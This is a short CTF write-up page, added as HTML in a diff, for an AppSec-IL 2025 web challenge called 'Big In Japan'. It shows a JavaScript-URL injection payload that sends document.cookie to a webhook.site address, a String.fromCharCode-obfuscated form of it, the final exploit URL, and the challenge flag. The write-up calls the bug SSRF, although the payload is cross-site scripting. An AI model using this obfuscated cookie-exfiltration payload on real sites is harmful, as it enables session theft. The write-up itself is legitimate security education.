@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Big In Japan | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Big In Japan" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/appSec-IL-2025/Big%20In%20Japan/BigInJapan.html" />
+<meta property="og:url" content="http://localhost:4000/appSec-IL-2025/Big%20In%20Japan/BigInJapan.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Big In Japan" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"Big In Japan","url":"http://localhost:4000/appSec-IL-2025/Big%20In%20Japan/BigInJapan.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=885199f883f5b847967c84d0262eab1578eb3466">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          <ul>
+            <li class="fork"><a href="https://github.com/avishaigonen123/CTF_writeups">View On GitHub</a></li>
+            
+          </ul>
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Avishai's CTF Writeups</h1>
+          <p>...</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/avishaigonen123">avishaigonen123</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="big-in-japan">Big In Japan</h1>
+
+<ul>
+  <li>
+    <h2 id="category-web"><strong>Category:</strong> Web</h2>
+  </li>
+</ul>
+
+<p>The challenge is based on SSRF vuln.</p>
+
+<p>We injecting this payload, to the insecure url parameter:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location.href='https://webhook.site/b9845d0e-4624-4ee7-89c9-90bfd2b1d3eb?data=' + document.cookie;
+</code></pre></div></div>
+
+<p>We obufacte this by this way:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String.fromCharCode(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,98,57,56,52,53,100,48,101,45,52,54,50,52,45,52,101,101,55,45,56,57,99,57,45,57,48,98,102,100,50,98,49,100,51,101,98,63,100,97,116,97,61,39,32,43,32,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59
+</code></pre></div></div>
+
+<p>And then, the final payload is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://big-in-japan.appsecil.ctf.today/?url=jaVasCriPt:eval(String.fromCharCode(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,98,57,56,52,53,100,48,101,45,52,54,50,52,45,52,101,101,55,45,56,57,99,57,45,57,48,98,102,100,50,98,49,100,51,101,98,63,100,97,116,97,61,39,32,43,32,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))
+</code></pre></div></div>
+
+<p>And the image, from the webhook site:</p>
+
+<p><img src="/appSec-IL-2025/Big%20In%20Japan/Final.png" alt="web hook" /></p>
+
+<p>The flag is <code class="language-plaintext highlighter-rouge">AppSec-IL{omedetto}</code></p>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
